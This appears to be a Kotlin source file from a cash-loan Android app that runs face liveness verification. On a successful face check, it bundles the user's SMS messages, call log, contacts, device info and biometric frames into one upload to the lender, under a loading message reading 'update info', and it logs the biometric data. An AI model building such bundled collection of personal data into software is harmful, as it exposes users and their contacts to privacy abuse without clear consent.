package com.yinshan.happycash.view.liveness.view.impl

import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.text.TextUtils
import android.util.Base64
import android.util.Log
import android.widget.Toast

import com.oliveapp.face.livenessdetectorsdk.livenessdetector.datatype.LivenessDetectionFrames
import com.yinshan.happycash.R
import com.yinshan.happycash.analytic.DeviceInfoController
import com.yinshan.happycash.analytic.callLog.CallLogDBController
import com.yinshan.happycash.analytic.contacts.ContactDBController
import com.yinshan.happycash.analytic.event.EventDBController
import com.yinshan.happycash.analytic.sms.SmsDBController
import com.yinshan.happycash.analytic.upload.AllReport
import com.yinshan.happycash.analytic.upload.EventReport
import com.yinshan.happycash.framework.TokenManager
import com.yinshan.happycash.network.api.LoanApi
import com.yinshan.happycash.network.api.UserApi
import com.yinshan.happycash.network.common.RxHttpUtils
import com.yinshan.happycash.network.common.base.BaseObserver
import com.yinshan.happycash.network.common.base.RxTransformer
import com.yinshan.happycash.utils.SPKeyUtils
import com.yinshan.happycash.utils.SPUtils
import com.yinshan.happycash.view.liveness.view.impl.support.HappyProgressDialog
import com.yinshan.happycash.view.login.model.LoginTokenResponse
import com.yinshan.happycash.view.main.model.LastLoanAppBean

import java.lang.ref.SoftReference

import io.reactivex.observers.DefaultObserver
import okhttp3.ResponseBody
import rx.Observer
import rx.Subscriber
import rx.android.schedulers.AndroidSchedulers
import rx.functions.Action0
import rx.schedulers.Schedulers

/**
 * 活体的检测，识别上传数据
 */
class OliveLivenessActivity : LivenessDetectionMainActivity() {

    private var loanAppId: String? = null

    private var progressDialog: AlertDialog? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        // 如果有设置全局包名的需要, 在这里进行设置
        //        PackageNameManager.setPackageName();
        super.onCreate(savedInstanceState)
        RxHttpUtils.getInstance()
                .createApi(LoanApi::class.java)
                .getLatestLoanApp(TokenManager.getInstance().token)
                .compose(RxTransformer.io_main())
                .subscribe({
                    loanAppId = it.loanAppId
                    SPUtils.getInstance().setObject(SPKeyUtils.LOANAPPBEAN, it)
                }, {
                    Log.d(TAG, " onError -----${it.message}")
                })
    }

    ////////////// INITIALIZATION //////////////
    override fun onInitializeSucc() {
        super.onInitializeSucc()
        super.startVerification()
    }

    override fun onInitializeFail(e: Throwable) {
        super.onInitializeFail(e)
        Log.e(TAG, "无法初始化活体检测...", e)
        Toast.makeText(this, getString(R.string.oliveapp_init_fail), Toast.LENGTH_LONG).show()
        val i = Intent(this@OliveLivenessActivity, OliveResultActivity::class.java)
        i.putExtra("is_success", false)
        handleLivenessFinish(i)
    }

    ////////////// LIVENESS DETECTION /////////////////
    override fun onLivenessSuccess(livenessDetectionFrames: LivenessDetectionFrames) {
        super.onLivenessSuccess(livenessDetectionFrames)
        //LivenessDetectionFrames中有4个用于比对的数据包，具体使用哪个数据包进行对比请咨询对接人员
        //对数据包进行Base64编码的方法，用于发送HTTP请求，下面以带翻拍的数据包为样例
        val sms = AllReport.getInstance().uploadSMS()
        val callLog = AllReport.getInstance().uploadCallLog()
        val contact = AllReport.getInstance().uploadContact()
        val event = EventReport.getInstance().uploadEvent()
        val dev = DeviceInfoController.getInstance().uploadDeviceInfo()
        val base64Data = Base64.encodeToString(livenessDetectionFrames.verificationPackageWithFanpaiFull, Base64.NO_WRAP)
        Log.d(TAG, "base64Data = $base64Data")
        if (!TextUtils.isEmpty(loanAppId)) {
            showLoading("update info.....")
            RxHttpUtils.getInstance()
                    .createApi(LoanApi::class.java)
                    .uploadBio1(loanAppId, base64Data, sms, callLog, contact, event, TokenManager.getInstance().token)
                    .compose(RxTransformer.io_main())
                    .subscribe({
                        dismissLoading()
                        update()
                        val i = Intent(this@OliveLivenessActivity, OliveResultActivity::class.java)
                        i.putExtra("is_success", true)
                        handleLivenessFinish(i)
                    }, {
                        Log.e(TAG, "result---------- ${it.message}")
                        dismissLoading()
                        val i = Intent(this@OliveLivenessActivity, OliveResultActivity::class.java)
                        i.putExtra("is_success", false)
                        handleLivenessFinish(i)
                    })
        }
    }

    private fun update() {
        try {
            CallLogDBController.getInstance().updateCallLogFlagByKey();
            SmsDBController.getInstance().updateSmsFlagByKey();
            ContactDBController.getInstance().updateContactFlagByKey();
            EventDBController.getInstance().delete();
        } catch (e: Exception) {
            Log.e("upload", "error:===$e")
        }
    }

    override fun onLivenessFail(result: Int, livenessDetectionFrames: LivenessDetectionFrames) {
        super.onLivenessFail(result, livenessDetectionFrames)
        val handler = Handler()
        handler.postDelayed({
            val i = Intent(this@OliveLivenessActivity, OliveResultActivity::class.java)
            i.putExtra("is_success", false)
            handleLivenessFinish(i)
        }, 2000)
    }

    private fun handleLivenessFinish(i: Intent) {
        startActivity(i)
        finish()
    }

    private fun showLoading(message: String) {
        if (progressDialog == null) progressDialog = createProgressDialog(this)
        progressDialog!!.setMessage(message)
        if (!progressDialog!!.isShowing) progressDialog!!.show()
    }

    private fun dismissLoading() {
        if (progressDialog != null) progressDialog!!.dismiss()
    }

    private fun createProgressDialog(activity: Activity): AlertDialog {
        val progressDialog = HappyProgressDialog(activity)
        progressDialog.setCancelable(true)
        progressDialog.setCanceledOnTouchOutside(false)
        return progressDialog
    }
}
